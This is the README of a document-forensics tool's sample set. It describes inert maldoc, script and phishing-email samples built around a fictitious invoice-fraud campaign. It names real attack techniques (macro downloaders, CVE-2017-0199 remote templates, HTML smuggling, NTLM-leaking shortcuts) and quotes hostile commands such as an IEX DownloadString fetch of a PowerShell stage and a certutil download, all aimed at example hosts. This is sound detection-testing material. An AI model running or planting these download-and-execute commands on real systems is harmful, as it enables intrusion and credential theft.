# Samples

Realistic, **benign** sample files — one per supported type — to try every
DocuTraceX module. Upload any of them and open the case in **Components**.

<!-- id: gmzpt -->

They all tell one fictitious story: an **invoice-fraud campaign** that
impersonates a supplier, *Suministros Iberia S.L.*, against the finance team of
*Grupo Ejemplo* ("factura 2026-0187 pendiente de pago — hemos cambiado nuestra
cuenta bancaria"). Each file is a structurally real document of its type and
carries the techniques real maldocs use.

> **Nothing here is malware.** Every host is a reserved `*.example` domain
> (RFC 2606), every address a TEST-NET IP (RFC 5737), and the "payloads" are
> inert placeholders (`MZ` + a text line, `MsgBox` scripts). The macros and
> scripts reference those inert values only.

## Getting the files

The samples are stored **compressed and encrypted** in `samples/samples.zip`
with the customary password **`infected`**, so antivirus engines, mail gateways
and Git hosting scanners do not flag or quarantine them (they would: the files
carry real exploit *structures*, even if every payload is inert).

```bash
python scripts/samplegen.py --extract   # unpack into samples/ (git-ignored)
python scripts/samplegen.py             # regenerate samples/samples.zip
```

Or open the archive with 7-Zip, WinRAR or Windows Explorer (password `infected`).
The test suite unpacks it on its own.

**Layout of the archive** — one folder per file type, and one sub-folder per family under `c2/`:

| Folder | What |
|---|---|
| `email/` | `.eml`, `.emlx`, `.msg` |
| `word/`, `excel/`, `powerpoint/`, `onenote/` | Office documents (Word also holds `.rtf`) |
| `pdf/` | PDF |
| `javascript/`, `powershell/`, `vbscript/`, `batch/`, `hta/`, `python/` | scripts (`python/` also holds `.pyc`) |
| `shortcuts/` | `.lnk`, `.url` |
| `archives/`, `disk-images/`, `installers/` | ZIP / TAR / CAB, ISO, MSI |
| `windows-pe/`, `dotnet/`, `go/`, `linux-elf/`, `java/`, `android/` | binaries by platform |
| `images/` | images (stego) |
| `c2/<family>/` | `cobaltstrike`, `metasploit`, `agenttesla`, `asyncrat`, `darkgate`, `nanocore`, `njrat`, `quasar`, `raccoon`, `redline`, `remcos`, `snakekeylogger`, `warzone`, `xworm` |

The generator keeps its own keys; `archive_path()` in the generator decides the folder of each sample.

The generator itself (`make_samples.py`) ships **encrypted** in `scripts/make_samples.zip` (password
`infected`) because antivirus engines flag its source; `scripts/samplegen.py` runs it from memory.
To edit it: `python scripts/samplegen.py --unpack`, change `scripts/make_samples.py` (git-ignored), then
`python scripts/samplegen.py --pack`.

## Campaign indicators (all inert)

| Indicator | Role |
|---|---|
| `cdn-update.example.net` — `http://cdn-update.example.net/files/upd.bin` | payload download |
| `198.51.100.23` — `http://198.51.100.23/plantillas/Normal.dotm`, `/a.ps1` | remote template, PowerShell stage 2 |
| `203.0.113.47` | sending VPS, OLE2Link target, form collector |
| `login.rnicrosoft-online.example` | look-alike Microsoft 365 login (phishing page) |
| `suministros-iberia.example.com` | the impersonated supplier |
| `pagos.suministros@mail-box.example.org` | Reply-To used to divert the payment |

<!-- c9omYR6Yrv -->

## What each file contains

| File | What you should see |
|---|---|
| `word/sample.docm` | *Factura 2026-0187*. VBA downloader (`AutoOpen`/`Document_Open`, `URLDownloadToFileA` declare, hex-decoded URL, `WScript.Shell.Run`), Base64 PowerShell stored in a **document variable**, a **DDEAUTO** field, custom properties, rsids. ViperMonkey emulates the download and the commands. |
| `word/sample.docx` | Commercial proposal with **remote template injection** (`attachedTemplate` → `198.51.100.23`) and an `INCLUDEPICTURE` tracking image. No macros. |
| `word/sample.dotx` / `word/sample.dotm` | Corporate template with a tracking image / a **global template** with `AutoExec` persistence (copies itself to Word STARTUP) and `AutoNew`, plus a remote template. |
| `excel/sample.xlsx` | Invoice sheet with `WEBSERVICE` / `FILTERXML` formulas and a **hidden** sheet holding the "new IBAN". |
| `excel/sample.xlsm` `.xltm` `.xlam` | Same, plus a **very-hidden Excel 4.0 macro sheet** with `Auto_Open` → `CALL(urlmon, URLDownloadToFileA)` + `EXEC(rundll32 …)`, and VBA `Workbook_Open` (XMLHTTP + ADODB.Stream + Shell). |
| `excel/sample.xltx` | Template version of the invoice workbook (no macros). |
| `excel/sample.xlsb` | oletools' benign Excel 4.0 test file (`ALERT` + `HALT` in an XLM macro sheet with `Auto_Open`); see *Third-party* below. |
| `powerpoint/sample.pptx` `.potx` `.sldx` | "New supplier payment procedure" slides with a link to the look-alike login page. |
| `powerpoint/sample.ppsx` | Slideshow with the **mouse-over `ppaction://program`** trick (PowerShell download on hover). |
| `powerpoint/sample.pptm` `.potm` `.ppsm` `.ppam` `.sldm` | Same slides plus VBA `Auto_Open` launching `mshta` through WMI (`Win32_Process.Create`). |
| `word/sample.doc` | Legacy Word binary: the VBA downloader, SummaryInformation, and an **Equation Editor** object in the ObjectPool (CVE-2017-11882 shape). |
| `word/sample.dot` | Legacy template with `AutoExec`/`AutoNew` and an **OLE Package** carrying `Factura.pdf.vbs` (extracted and scanned recursively). |
| `excel/sample.xls` `.xlt` `.xla` | BIFF8 workbook with a **very-hidden Excel 4.0 macro sheet** and VBA `Workbook_Open`. |
| `powerpoint/sample.ppt` `.pot` | Legacy PowerPoint with data **appended after the compound file**. |
| `word/sample.rtf` | RTF invoice: **Equation Editor** object with junk inside `\objdata`, **OLE2Link** + `\objupdate` (CVE-2017-0199) to `203.0.113.47`, an **OLE Package** (`Factura.pdf.vbs`), remote `\*\template`, `INCLUDEPICTURE` and a hyperlink field. |
| `pdf/sample.pdf` | Invoice lure "protected by Microsoft 365": **OpenAction JavaScript** obfuscated with `eval(unescape(...))` that exports and opens the embedded `report.docm` and launches the phishing URL (the V8 sandbox unfolds it), a **Launch** action, a link and a **QR code** to the look-alike login, a credential **form submitting** to `203.0.113.47`, and the macro document **embedded**. |
| `email/sample.eml` | The phishing email: SPF/DKIM/DMARC fail, two `Received` hops from `203.0.113.47`, PHPMailer, Reply-To diversion, a **DKIM signature broken by a later edit** of the amount (1.250,00 → 7.250,00), a **Safe Links + Proofpoint** wrapped link to the look-alike domain, hidden text and a tracking pixel. Attachments: `report.docm`, `pedido.doc` (**the RTF disguised as .doc**), `Factura_2026-0187.pdf.exe` (double extension), `Factura.html` (**HTML smuggling**: `atob` → Blob → download, then redirect) and `escanear.png` (**QR code**). All attachments are analysed recursively. |
| `email/sample.emlx` | The same message in Apple Mail's `.emlx` wrapper. |
| `email/sample_gateway_links.eml` | A **legitimate** remittance notice whose links went through the recipients' own mail security gateways: Safe Links (Outlook and Teams), Proofpoint v3, Cisco Secure Email, Sophos, Egress (base64 + zlib), Check Point / Avanan, Trellix, Symantec ClickTime, Amazon SES tracking, Mimecast (domain hint) and one link through **six gateways in a row** (Libraesva → Egress → Cisco → Sophos → EdgePilot → Barracuda). Expected: **no finding** for the rewriting (it is infrastructure, shown under *Links rewritten by a mail gateway*), every link decoded to its original, and the **IOCs only the original destinations** (`suministros-iberia.example.com`, `cdn-update.example.net/…/remesa_2026-0613.pdf`) — never a gateway host. |
| `email/sample_bec_freemail.eml` | **Invoice / BEC fraud** from a mail.com vanity address (`accountant.com`): a "Directora Financiera" announces a new IBAN, urgent and confidential, and asks to reply to `pagos.direccion@usa.com`. Expected verdict **phishing**: `bec_bank_details_change`, `bec_urgent_payment`, `freemail_business_request`, `executive_display_name_external`, `mailto_freemail_in_body`, `sender_freemail`. |
| `email/sample_toad.eml` | **Callback phishing (TOAD)**: a fake renewed subscription with a (fictional 555-01xx) phone number to call, no link. Verdict **phishing**: `callback_phishing`, `dmarc_fail_policy_none`. |
| `email/sample_phish_kit_links.eml` | **Credential phishing with kit-style links**: a "mailbox full" lure whose link carries the **recipient's address** (`?email=cuentas.pagar@…`), lure words **glued into the path** of a compromised site (`…/scaverserverriorukuse-seceriwertorismailserv99/he-opas.html`), a second link on a `/wp-content/` kit page with an **unfilled merge tag** (`?email=[[-Email-`), and the recipient gateway's *Report phish* button (Proofpoint PhishAlarm — infrastructure: not an IOC, not judged). Verdict **phishing**: `link_recipient_in_url`, `link_phishing_kit_path`, `link_unfilled_placeholder`, `link_credential_harvest_pattern`, `credential_lure`. |
| `email/sample_email_chain.eml` | **Thread hijack** in an invoice conversation, for the **Chain** sub-tab: the first message is attached as `.eml` (John → Alice, CC Bob, BCC archivo), the second is **quoted** in the body (Outlook block: Alice adds `facturacion@proveedor-pagos.example` in CC and drops Bob), and the message itself comes from that new address — a look-alike of the supplier — asking for a new IBAN. Chain shows 3 messages, the added / removed participants (the BCC disappearing is marked as expected), the **sender change**. `References` names `<msg-000@…>`, which is not in the file: that is the normal case for a thread (a forward never carries every earlier message), so it is shown only in the message's details, not as a warning. Every participant of every message (From / To / CC / BCC…) becomes an email + domain IOC tagged with its message and field. Its `Date` is in UTC (08:48 +0000, as Exchange Online stamps it) and its last `Received` hop in Madrid time (+0100): Chain reads the quoted, zone-less times in that zone, so the reply (09:48 local) is not taken as older than the quoted 9:32. The Message-IDs (`msg-000@…`) are identifiers, not mailboxes: they are not IOCs. Thread rules: `thread_hijack_injected_participant` (high — added in CC from a new domain, then writes). |
| `email/sample_chain_no_display.eml` | A long internal invoice thread quoted the way Outlook does it when senders have **no display name** (`De: facturacion@grupoejemplo.example <facturacion@grupoejemplo.example>`), with one block in **bold rendered as text** (`**De:**`) and one with **HTML-escaped** brackets (`&lt;addr&gt;`). **Chain**: 6 messages, every quoted one with its From / To / CC and subject (before, those without a display name showed only the subject). `References` names earlier messages that are not in the file — the normal case for a thread, so no warning. |
| `email/sample_m365_headers.eml` | A message as **Exchange Online** receives it, for the *Microsoft 365* box (Authentication sub-tab): the sender's tenant block (`CrossTenant-AuthAs: Internal`) and the receiving one (`Anonymous` / `Internet`), EOP's verdict `CAT:PHSH`, `SFV:SPM`, `SFTY:9.25` (first contact), `compauth=fail reason=601` (your own domain spoofed), `X-Originating-IP` and `X-OriginatorOrg` (≠ From), a `Date` two days after Exchange's arrival time and a `Thread-Index` that starts after the `Date`. From uses the victim's own domain. Rules: `ms_classified_phishing`, `ms_originator_org_mismatch`, `ms_date_vs_arrival`, `thread_index_after_date`, `ms_country_not_allowed` (with an allowed-country list in Settings that leaves out NL), `ms_spam_verdict`, `ms_compauth_fail`, `ms_first_contact` (info) and, with the domain set in Settings as your own, `ms_own_domain_from_internet`. The connecting IP, client IP and PTR / HELO become IOCs. Each tenant ID is looked up in AZMap (only the ID is sent; cached; off in Settings) — the GUIDs here are made up, so AZMap finds nothing. |
| `email/sample_brand_lookalike.eml` | Sender and link on `micrsofl.example`, **two edits** away from *microsoft* (authenticated, so only the look-alike gives it away). Caught with the default look-alike thresholds — names of up to 4 letters → 1 edit, longer → 2, not compared under 4 letters — editable in Settings → *Email rules: your organisation* and shared by the own-domain and brand look-alike checks (`docutracex/similarity.py`). |
| `email/sample_newsletter.eml` | A **legitimate** newsletter through an email service provider (SendGrid headers, List-Unsubscribe, ESP bounce domain, click-tracking link, tracking pixel). Verdict **clean** (`legit_esp_newsletter` lowers it); the tracking pixel is still reported, and the tracking link is no `url_display_mismatch`. |
| `email/sample_rmm_support_scam.eml` | Remote-support scam: *"la factura no se ha podido procesar — descargue AnyDesk desde `https://descargas.factura-soporte.example/AnyDesk.exe` y envíenos el ID"*, with TeamViewer mentioned in passing in the signature. **RMM mentions** (LOLRMM + built-in names): `rmm:mention` **medium** for AnyDesk (next to its installer link), **info** for TeamViewer (name only); one finding per product. In **IOCs** the installer URL carries the badge *RMM: AnyDesk* — context only, the IOC is not raised. |
| `email/sample_exchange_messageid.eml` | A **legitimate** supplier email sent from Microsoft 365: Exchange Online names the Message-ID after the mailbox server (`…@AM0PR00MB0002.eurprd00.prod.exchangelabs.com`), not after the From domain. `messageid_domain_mismatch` is kept as **info** context (*generated by Exchange Online*), with no score, no spoofing alert and no IOC. Its `Received` hops go from `…prod.exchangelabs.com` to `…outbound.protection.outlook.com`: Exchange Online's own domains, so no `received_chain_break`. SPF / DKIM / DMARC pass, verdict **clean**. |
| `email/sample_tenant_typosquat.eml` | Bank-details fraud from `grupoejernplo.example` ("rn" for "m": a typosquat of the victim's own domain) sent from a Microsoft 365 tenant (`X-MS-Exchange-CrossTenant-Id`, AuthAs Internal). When AZMap lists that tenant as a throw-away one — *Northwind Community College* holding the typosquat as a **Managed** domain plus unrelated and 4 removed domains (the tests mock this answer; DocuTraceX looks it up live), and tenant.fyi adds its other name *Quorvane Trading* and a fifth former domain with first / last seen (`TENANT_FYI_ANSWER` in the generator) — the tenant ID, `nwcollege0.onmicrosoft.com` and the former domains land in the IOCs tagged *tenant* — `tenant_sender_lookalike` (high: verified or not, it imitates your domain) and `tenant_domain_sprawl` fire, verdict **phishing**. Set `grupoejemplo.example` as an own domain in Settings to see it. |
| `email/sample_lure_attachments.eml` | A fake `RE:` with no thread, a ZIP flagged as **encrypted with its password in the body**, an **SVG with script** and a **calendar invite** with a link. Verdict **malicious**: `password_protected_attachment`, `svg_active_content`, `calendar_invite_links`, `fake_reply_thread`. |
| `archives/sample_many_files.zip` | An installer-style kit with **80 files**, more than the per-file deep-analysis limit (60, `DOCUTRACEX_NESTED_MAX_CHILDREN`). Expected in **Nested**: all 80 children — the first 60 analysed, the other 20 *listed · not analysed in depth* (name, type, size, SHA-256, Folder / Download / Hex). Archives and MSIs extract up to 1000 entries (`DOCUTRACEX_ARCHIVE_MAX_ENTRIES`) and 500 MB (`DOCUTRACEX_ARCHIVE_MAX_MB`); an analysed file's own children up to 1000 are listed. |
| `email/sample.msg` | The same message as an Outlook `.msg` (MAPI streams, HTML body, the same attachments). |
| `email/sample_encrypted.eml` | Gateway evasion: `Factura_2026-0187.zip` (**WinZip AES**) holding a **password-protected** `.xlsm`, with *"La contraseña del archivo es: Fact2026"* in the body. DocuTraceX finds the password, opens the ZIP and the workbook, and analyses the macros inside (Nested tab). |
| `excel/sample_velvet.xlsm` | The macro workbook encrypted with Excel's built-in **`VelvetSweatshop`** password (opens without a prompt, scanners see only ciphertext): decrypted automatically, flagged high, and the decrypted copy analysed. |

**Email rules and verdict.** Besides the built-in checks, every email goes
through the declarative rules of `docutracex/rules/email/*.yml` (plus your own in
`config/rules/email/*.yml`, which can add rules or override one by id): a
condition over the message's facts (sender, Reply-To, authentication, ESP,
thread, recipients, body lexicons in ES/EN/DE/FR/IT/PT, links already decoded
from the gateways — and their shape: the recipient pre-filled in the URL, kit-style
paths, unfilled merge tags, user-info and punycode tricks — attachments' bytes), a severity, a score and ATT&CK ids. The
**verdict** (*clean / suspicious / phishing / malicious*) adds the scores of the
rules and of the built-in findings, minus legitimacy signals (an authenticated
newsletter from a known ESP), and lists what raised and what lowered it;
*malicious* needs a payload or known-bad signal (smuggling, executable, implant
config, reputation feed hit…). A second pass after the whole case ran uses what
the attachments and links turned into (nested findings, C2 configurations).
Reputation lists (Settings → *Email reputation lists*, refreshed on start): free
webmail (Kikobeats, MIT — includes the mail.com vanity domains), disposable
(CC0), phishing domains / IPs (Phishing.Database, MIT), URLhaus hosts (CC0);
built in: big webmail providers, commonly abused TLDs, ESPs and their trackers,
legitimate hosting abused for phishing. Settings → *Email rules: your
organisation* takes your own domains (spoofing / look-alikes of them weigh most)
and extra brands.

## Deobfuscation demos (standalone scripts)

Dropped/attached scripts whose intent only shows **after deobfuscation** — one per engine, so uploading each exercises the "deobfuscate first, then analyse" path. All inert: the recovered payloads reference the same campaign indicators (`198.51.100.23/a.ps1`, `cdn-update.example.net`). Open **Components → the language tab**: the **Deobfuscated** view carries the recovered code (hits highlighted) with Folder/Download, and **Original (obfuscated)** is one click away.

| File | What you should see |
|---|---|
| `javascript/sample_dropper.js` | A `.js` whose whole body is `eval(unescape("%..%.."))` (one long run of percent escapes — the reference case). The multi-pass decoder peels it to a JScript dropper: `MSXML2.XMLHTTP` GET of `cdn-update.example.net`, then `WScript.Shell.Run` of `powershell … -enc <Base64>`. **JavaScript** tab. |
| `javascript/sample_lookalike_domains.js` | A dropper config (inert JScript: it only echoes) for the **global domain-similarity engine**, which runs on the domains of any file type: `micr0soft-update.example` (brand embedded with look-alike characters), `docusing.example` (adjacent letters swapped: Damerau-Levenshtein 1, Levenshtein 2), `xn--pypal-4ve.example` (a Cyrillic `а` in *paypal*), the supplier `suministros-iberia.example` next to its one-letter twin `suministros-lberia.example`, and *outlook* misspelt inside longer names — `outloook-outlet.example` (a word one edit away) and `myoutlok365.example` (one edit, glued to other text) — next to the real `outlook.office.com`, which is a **generic legitimate service** (Settings) and is never reported. Shown in the **Look-alike domains** sub-tab; findings `domain_lookalike_brand` (high) and `domain_similar_in_case` (low). With your own domains in Settings, look-alikes of them are `domain_lookalike_own` (high). |
| `javascript/sample_obfuscatorio.js` | A `.js` obfuscated with **obfuscator.io** (string-array + rotator + accessor, control-flow flattening) — the scheme the pure-Python cascade can't flatten. With **webcrack** provisioned (portable Node), the Deobfuscated view shows the clean `function stage(){ … }` with the real URL, `powershell -enc …` and `ActiveXObject("WScript.Shell").Run`. **JavaScript** tab. |
| `javascript/sample_obf_techniques.js` | JScript dropper stacking the obfuscation techniques DocuTraceX names: fake **jQuery header**, **arithmetic literals** `(40+20)`, a massive `\xNN` **escape block**, a custom **XOR decryptor** with a hard-coded key over a **numeric payload array**, **fromCharCode with arithmetic**, an **IIFE** fed a long string, and **anti-sandbox timing** (`WScript.Sleep` + a `Date` delta). **JavaScript** tab → *Confirmed obfuscation techniques*: 7 static + 4 resolved in the sandbox, including the decrypted (inert) PowerShell payload that targets `billing-portal.example`. |
| `javascript/sample_chain_dropper.js` | Three-language chain to see the **whole behaviour** — every decrypted stage becomes a **nested child** re-analysed by whatever fits it: the JScript XOR-decrypts a **VBScript** and drops it → the VBScript runs `powershell -enc …` → the PowerShell stager XOR-decrypts a base64 blob with a string key and inflates a **Deflate** stage that downloads `stage4.ps1` from `billing-portal.example` and starts `inv_viewer.exe`. **Nested** tab: `decrypted_js-xor-dec_….vbs` (🔓 decrypted stage, analysed as vbscript + powershell); the final URL lands in **IOCs**. |
| `javascript/sample_wsh_selfread.js` | JScript loader with the **WSH tricks** real droppers use: a `WScript.Sleep` + clock-delta **anti-sandbox** check (passed: the sandbox's Sleep advances a virtual clock), it **reads itself** (`WScript.ScriptFullName`) to pull a payload hidden in a trailing comment, **writes it as a `.ps1`** with FileSystemObject (captured whole → nested child) and launches it hidden through **WMI `Win32_Process.Create`**. The `.ps1` hides a download URL in a **XOR'ed number array held in variables** (`-bxor $rk1`, decimals with leading zeros) and the task-scheduler strings in a **hex-decoder helper** scriptblock, then registers a logon **scheduled task**. **JavaScript** tab (sandbox log: drop, WMI) → **Nested** (`.ps1` with `ps_download`/`ps_iex`, ↗ PowerShell) → **PowerShell** tab (the dropped `.ps1` with its layers: `xor-var-array`, `hex-helper`; scheduled task, `[scriptblock]::Create`) → **IOCs** (`stage5.ps1`). |
| `javascript/sample_msxml_dropper.js` | The classic **binary drop** of JScript/VBScript loaders: a PE (inert stub) in base64 decoded through **MSXML** (`createElement` + `dataType = "bin.base64"` + `nodeTypedValue`), written with a **binary `ADODB.Stream`** to `%TEMP%\\invoice_viewer.exe` and run. **JavaScript** tab: `js_sandbox_b64_decode`, `js_sandbox_drop`, `js_sandbox_command`. **Nested**: the dropped `.exe`, byte-identical (recipe `js sandbox → wrote invoice_viewer.exe → exe`). |
| `powershell/sample_xor_stager.ps1` | The PowerShell stager alone: base64 + `-bxor` loop with a string key → Deflate (`MemoryStream` in a variable) → final `IEX DownloadString` + `Start-Process`, plus a URL hidden in a number array `[char]($_ -bxor 0x2a)`. **PowerShell** tab. **Nested**: the XOR stage (recipe `base64 → xor('inv')`) and inside it the Deflate stage (`base64 → deflate`) with the download findings. |
| `powershell/sample_encoded_blobs.ps1` | PowerShell whose data hides in literals its **own helper functions** decode, so the static deobfuscator leaves them encoded: a base64 of a **GZIP'ed config** (with the C2 URL `billing-portal.example/inv/c2`), an **encrypted-looking blob** and a **hex-encoded PE** (MZ + text stub, inert). **Nested**: every decoded literal becomes a child — the inflated config text (its URL lands in **IOCs**), the opaque blob (*opaque data · entropy ≈ 7.7*) and the `.exe`. |
| `powershell/sample_crypto_loader.ps1` | PowerShell loader whose stages are **encrypted with key material written in the script**: a PE (inert stub) **XOR'ed with one byte**, a GZIP'ed config under **AES-256-CBC** with `[byte[]]` key/IV arrays (decrypted by its own helper, so the deobfuscator can't fold it), and a payload in a **SecureString** exported with `-Key (1..32)`. **PowerShell** tab: the SecureString decrypted in place (`securestring`, URL `ss-stage.ps1`). **Nested**: the `.exe` (recipe `base64 → xor(0x5a) → exe`) and the config (recipe `base64 → aes-256-cbc(…) → gzip → text`, URL `aes-c2` in **IOCs**). |
| `powershell/sample_invoke_obfuscation.ps1` | Invoke-Obfuscation-style launcher with four layers: an aliased `Invoke-Expression` running a string reversed with `[regex]::Matches(…,'RightToLeft')`; then `&(gcm *ke-e*)` with `-replace 'Qz7',[char]39`; then `iex` built from `$PSHome[4]+$PSHome[30]+'x'` over octal char codes split on `~`; then `$env:ComSpec[4,15,25]-join''` over a reversed string. **PowerShell** tab: `ps_invoke_obfuscation` and the clean invoice downloader. **IOCs**: `billing.invoice-portal.example` and `203.0.113.17`. |
| `vbscript/sample_xor_loader.vbs` | VBScript loader with the classic **decryptor loop**. The stage is hex text built with `d = d & "…"` lines, XOR'ed with the string key `Factura0613` inside `For i = 1 To Len(d) Step 2 … Chr(CLng("&H" & Mid(d,i,2)) Xor Asc(Mid(k,…)))`, and run with `Execute s`. Inside the stage: `Replace`, `StrReverse` and `Chr(83 Xor 0)` hide an `MSXML2.XMLHTTP` download of the invoice and a hidden PowerShell. **VBScript** tab: methods `xor-loop`, `execute-variable` and the clean stage (plus ViperMonkey emulation when provisioned). **IOCs**: `invoice-cdn.example`, `198.51.100.23`. |
| `batch/sample_dosfuscation.bat` | Batch launcher with **DOSfuscation**: `powershell` rebuilt by a FOR-loop index list over the scrambled set `lrhweops`, the URL reversed with `for /L … (N,-1,0)`, `cmd` sliced from `%COMSPEC:~-n,1%`, and an inline `set` chain in `cmd /V:ON /C "…&&…"` with caret and `""` noise. **Batch** tab: methods `for-loop decode`, `builtin-var slicing`, `quote noise` and the clean `call powershell -w hidden -c iwr …`. **IOCs**: `invoice-files.example`. |
| `python/sample_exec_chain.py` | Python dropper inside the **exec chain** that public obfuscators produce: an `lzma` + `base85` layer, then a lambda that reverses base64 + `zlib`, then 3 × `zlib.decompress(base64.b64decode(…))`. **Python** tab: `py_exec_layers` (5 layers, recipe shown) and the clean core, which downloads the invoice with `urllib` and starts it hidden. **IOCs**: `invoice-sync.example`, `203.0.113.50`. |
| `windows-pe/sample_lief_helper.dll` | Minimal, inert PE32+ DLL (its only code is `ret`) built for **LIEF**. It has a CodeView **PDB path** (`C:\Users\jmartin\source\repos\InvoiceSync\…\invoice_helper.pdb`), a **forwarded export** `GetFileVersionInfoW → version.GetFileVersionInfoW` (proxy-DLL pattern), a manifest with `requireAdministrator` + `autoElevate`, a wrong header **checksum** and an 8 KB high-entropy **overlay**. **Binary** tab → **LIEF**: `lief_pdb_path`, `lief_forwarded_exports`, `lief_manifest_autoelevate`, `lief_checksum_mismatch`, `lief_overlay_encrypted`. **IOCs**: the PDB path. |
| `windows-pe/sample_signed_bootstrapper.exe` | *InvoiceSync Setup*, shaped like a **legitimate** signed installer bootstrapper: its client (signed-looking too) as a file in `RT_RCDATA`, only the imports any C runtime has (LoadLibrary / GetProcAddress / IsDebuggerPresent), a **reproducible build** (its "compile date" is a hash that reads as 2063) and .NET member names in its strings (`IntPtr.Zero`, `InvoiceSync.Client.Cloud`, `default.cab`). The analysis keeps it calm: the client is *stored as it is* (`pe:resource_file`, info — not *stego*), imports **low**, *compiled: not a date (reproducible build)*, no `pe_masquerade` for the extracted client, none of those strings as IOCs; `pe_embedded_pe` stays **medium** only because the (inert) signature cannot be verified — with a valid one it is low. Its signature is **not counted as an overlay** (no `pe_overlay` / `lief_overlay_encrypted`); bytes stamped *after* a signature would give `pe_data_after_signature` (medium). |
| `windows-pe/sample_resource_images.exe` | *FacturaViewer.exe* carrying the images droppers usually keep in their native resources: a logo as `RT_BITMAP` (rebuilt as a `.bmp`), a PDF-looking icon as `RT_ICON` (wrapped as an `.ico`) and a splash PNG in `RT_RCDATA`. None hides anything; they still appear in **Nested** as *🖼 image (PE resource)* with the resource they came from, so the analyst can look at them (Folder / Download / Hex). |
| `word/sample_media.docx` | A Word document whose only body is a picture — the *"pulse HABILITAR CONTENIDO para ver la factura"* lure — in `word/media/image1.png`. It appears in **Nested** as *🖼 image (Office media)*, so the lure itself can be seen. |
| `windows-pe/sample_bloated_section.exe` | **Binary padding inside a section** (no overlay): a stub whose `.data` is 6 MB of zeros. **Binary → Debloat** runs the per-section compression check (it used to fail with *unexpected keyword argument 'end'* on debloat ≥ 1.7) and reports the result; no error. |
| `windows-pe/sample_bloated_invoice.exe` | **Binary padding** (T1027.001): the LIEF helper DLL inflated to ~24 MB with a zero-filled overlay, so size-limited scanners and sandboxes skip it. The **Binary → Debloat** tab shows `padded` ("Single repeated byte in overlay", 24 MB → 15 KB) and the finding `pe_bloated`; unpacking, FLOSS and capa are skipped on the padded file. **Nested** has the real binary (recipe `debloat → …`) with its full PE/LIEF analysis (`lief_forwarded_exports`, PDB path…). **Code** analyses only that clean child; the padded original is listed as *analysed in its clean child*. |
| `powershell/sample_stage2.ps1` | A PowerShell stage-2 loader hidden behind backticks (`` I`E`X ``) + Base64 (`[Convert]::FromBase64String`). Deobfuscates to `IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')`. With **box-ps** provisioned (portable PowerShell Core), the PowerShell tab also shows a **Sandbox** section with the emulated behaviour. **PowerShell** tab. |
| `vbscript/sample_dropper.vbs` | A `.vbs` that builds the stage-2 URL from `Chr()` codes and runs PowerShell through an `Execute()` wrapper. The string resolver recovers the URL and unwraps the `WScript.Shell.Run`. **VBScript** tab. |
| `batch/sample_dropper.bat` | A `.bat` using caret escaping (`p^o^w^e^r^shell`) + `set` indirection (`%a%%b%`) to hide a `powershell -enc` launch and a `certutil -urlcache` download. The batch deobfuscator resolves it; rules fire for PowerShell/LOLBin/download. **Batch** tab. |
| `hta/sample_loader.hta` | An `.hta` carrying **both** a VBScript block (`WScript.Shell.Run powershell …`) and a JScript block (`MSXML2.XMLHTTP` GET + `WScript.Shell.Run`). Exercises HTA container extraction into the VBScript **and** JavaScript engines at once. |
| `python/sample_dropper.py` | A `.py` dropper: `urllib.request.urlopen` of `198.51.100.23`, a `subprocess.Popen("powershell … -enc <Base64>", shell=True)` and an `exec(base64.b64decode(...))` wrapper. The light decoder peels the wrapper; rules fire for download, subprocess, LOLBin, exec and the attack chain. **Python** tab. |
| `python/sample_dropper.pyc` | The same dropper **byte-compiled**. With **pycdc** provisioned it decompiles to source; otherwise the engine reconstructs the dotted calls (`urllib.request.urlopen`, `subprocess.Popen`…) and strings from the bytecode. Same findings, plus the recovered Python version. **Python** tab. |
| `windows-pe/sample_pyinstaller.exe` | A minimal **PyInstaller-frozen** `.exe`: a PE stub with a CArchive holding the dropper as an entry script. DocuTraceX finds the `MEI` cookie, unpacks the CArchive/PYZ, writes the module back as `.pyc` and analyses it — **PyInstaller** tab (version, entries), **Python** tab (the recovered code) and **Nested** tree. The PE also keeps its hashes/YARA/report. |
| `batch/sample_ioc_noise.bat` | Batch helper with real (inert) IOCs plus **IOC noise** in comments: oletools/colorlog self-URLs, garbage "paths" (`\x4d\x5a…` escapes, mostly non-ASCII components) a `DocuTraceX` install path and fake two-letter TLDs (`cfg.zz`, `row.qq`, `data.xx`, rejected once the IANA list is downloaded). It also carries paths with spaces (the Startup folder under `Start Menu`, a quoted `C:\Program Files\Billing Portal\inv viewer.exe`) that must come out whole, and prose ("paid at month end", "type of payment") that must not become *Command* IOCs; the `powershell …` command must stop at its own line. Only `billing-portal.example`, `accounts@billing-portal.example`, `C:\Users\Public\Documents\invoice_view.exe` and the Startup `.lnk` should appear in the IOCs tab. |
| `archives/dropper_bundle.zip` | A plain ZIP bundling the scripts, shortcuts and Python above (`.js`, obfuscator.io `.js`, `.ps1`, `.vbs`, `.bat`, `.hta`, `.pdf.lnk`, `.url`, `.msi`, `.py`, `.pyc`). Upload it to exercise the **recursive (nested)** path: each child is parsed/deobfuscated on its own, and the recovered URLs appear as the child's IOCs (Nested tab). |

> The same engines run on these scripts wherever they hide — as a standalone upload, as an email/OLE attachment, or inside an archive — not only as loose files.

## Shortcuts and binaries

| File | What you should see |
| --- | --- |
| `shortcuts/sample_shortcut.pdf.lnk` | A `.lnk` disguised as a PDF (**double extension** `…pdf.lnk`) whose target is `cmd.exe` launching a hidden, Base64-encoded PowerShell stage. The **Shortcut** tab shows the target, arguments, working dir, icon and metadata; rules fire for the LOLBin target, the hidden window and the double extension, and the decoded `-enc` payload goes through the scripting engine (`IEX … DownloadString('http://198.51.100.23/a.ps1')` → PowerShell findings). |
| `shortcuts/sample_shortcut.url` | An Internet Shortcut whose `URL=` points to a **remote executable** over `file://203.0.113.47/…` (WebDAV/SMB) and whose `IconFile=` sits on a **UNC path** (forces SMB auth → NTLM hash theft). The **Shortcut** tab lists the URL/icon; rules fire for the remote-file target, the UNC-icon NTLM leak and the executable payload. |
| `installers/sample_installer.msi` | A Windows Installer (OLE/CFB). DocuTraceX decodes the mangled stream names, flags the **CustomAction**, **InstallExecuteSequence** and **Binary** tables, finds the **embedded Binary stream** (inert `MZ` stub), and mines `_StringData` — the PowerShell downloader it carries runs through the scripting engine (`IEX … DownloadString(…)`). **MSI** tab. |

